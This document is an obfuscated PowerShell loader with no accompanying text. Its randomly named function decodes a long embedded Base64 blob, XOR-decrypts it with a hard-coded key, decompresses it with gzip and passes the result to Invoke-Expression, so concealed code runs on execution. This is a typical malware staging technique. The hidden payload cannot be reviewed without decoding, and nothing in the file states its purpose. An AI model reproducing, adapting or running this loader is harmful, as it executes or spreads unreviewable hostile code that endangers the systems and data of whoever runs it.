$p6o95vc12g0wyda = [System.Text.Encoding]::ascii
function 9cyqef7loiv0x6jzk2pr1ad8hm4  {param($65x0kiw8q1bftpr )
  $fgmq3hj2ikuc9y8 = [System.Convert]::FromBase64String($65x0kiw8q1bftpr)
  $w9q8hk6rao1bf53= $p6o95vc12g0wyda.GetBytes("39gl52pzr8i0")
    $obwsyd9izpm2kcn = $fgmq3hj2ikuc9y8
    $6ojle7k05nhqzbg = $(for ($1zjdhq2x6ms0ink = 0; $1zjdhq2x6ms0ink -lt $obwsyd9izpm2kcn.length; ) {
        for ($gd3yxm92a46k1ln = 0; $gd3yxm92a46k1ln -lt $w9q8hk6rao1bf53.length; $gd3yxm92a46k1ln++) {
            $obwsyd9izpm2kcn[$1zjdhq2x6ms0ink] -bxor $w9q8hk6rao1bf53[$gd3yxm92a46k1ln]
            $1zjdhq2x6ms0ink++
            if ($1zjdhq2x6ms0ink -ge $obwsyd9izpm2kcn.Length) {
                $gd3yxm92a46k1ln = $w9q8hk6rao1bf53.length
            }
        }
    })
	$i8rdh9q74vomaxp = New-Object System.IO.MemoryStream( , $6ojle7k05nhqzbg )

	    $t6yg3b4cer17qjo = New-Object System.IO.MemoryStream
        $68t9z5d1ykbjrsa = New-Object System.IO.Compression.GzipStream $i8rdh9q74vomaxp, ([IO.Compression.CompressionMode]::Decompress)
	    $68t9z5d1ykbjrsa.CopyTo( $t6yg3b4cer17qjo )
        $68t9z5d1ykbjrsa.Close()
		$i8rdh9q74vomaxp.Close()
		[byte[]] $aqm90dp2i3n6ftr = $t6yg3b4cer17qjo.ToArray()
 $p5s6jdefxn13mc4=$aqm90dp2i3n6ftr
    return $p5s6jdefxn13mc4
}
[byte[]]$s1wntejqoi72rup=9cyqef7loiv0x6jzk2pr1ad8hm4 $j7u6obfgmikpqd9
[System.Text.Encoding]::ascii.GetString((9cyqef7loiv0x6jzk2pr1ad8hm4 "LLJvbDUycHp2OORlXlbEVCXMDDKOP6L6mt3VTMdArRfZRiGKh/Q6v955BMEF4QPVszoprGXpVNuvxJ4tbevBCAomVLqRyVr/DwpR1pPxTTHLkzH8os2/AP9gXz+aYb4gbzB2SAcoQ0UI1G/DPWLDgmTEmXkYfD01gu5L0S+giBOSKx26Fc7+OAGAtg7fFO6Lgv7fk0VOPN65oBxx5hk0OC8KFKS+N8+s0V8pTXJTQx4mgKGUvDFUlfz58l8cbg26YwxNgzxL334qtMTvavXwOB3CSG0DDEmiLc9N+w9IwzACi4zou55M9Ux1nFP7AmKnjAaEUd044POmNyE/syOhQCMSMYEb1my/rswGSFj0Z0oRp8kNmCDNUQNkOMPdunrkdwL1+Z2Mp7ek6Ti3xzdwgaVl2A8ZuTNlwDzKguBYzbuNrUejCeZgCHvlMB55BsCzDe1nB95p3c2BfdrcWtu0EXic+laEIH5xxXzOScpEvZwHYBReudcaXdpmg8cvgTRixvqJP2WneoRwkgIrztQZcUebOGKY4hoJgkLwXI/kYP4Jizozqsr/HVEqhsAZY38MvKPP6TlW3wGfRJVXTAJZQPMtEYZxOTjDPSmFZKxVAbBnUh4g60YgoyYFUJjTyRTjd7xt4WxwJPo8SerC1ggufroagtf+txwdaUFrhmoKjSyKg0iTb0h1veaxJWo5TbkKg9H9ct2o0CvOnE8zNmhmW0N0R6WMiHvpHa/hIHSuchFpmeydFK+HEE8XENvrGysN6BLJhMkDFmVJGiSaRYmhHZANIMX1JIhgY3lh9QJLfkJ9uPjJHDA01rKzvBdPadeHQJRsqWidOnXMsY6p0BXGpBFgohJoXmFnLgiba7uSWGsmckGSRvclRr4rDNgZq7PczBX+7TYG/skkutFaL0YB7o8YZuMj6pWwGRwXfzXi3g7Xewj8VpfrydvvPtRHPvbnCdnVD509fYaIC6lPrjSexFjp0yGVy6yQREe5c+9lW42Q6pbf2ODKj+v+Z9nMVzYJRI6RnHtMzY4lR1JD1ON+tJbMupcvN+8ny8xbu4AWLitTO3O2u+ryVTFoR1g82D3+hSynVNIzXx4sO1q0rkylaCVHmV9mzswIC4bR8YWhOQSb4vkf0DxS03FeJIcqShhjdnxmBvQK9HjTF+VHCObm7z6IJ2u9PEw6OeFwEi8znG/xRpNlm0ukea6h5UGAnF3NN51c3SJtd3py"))|iex;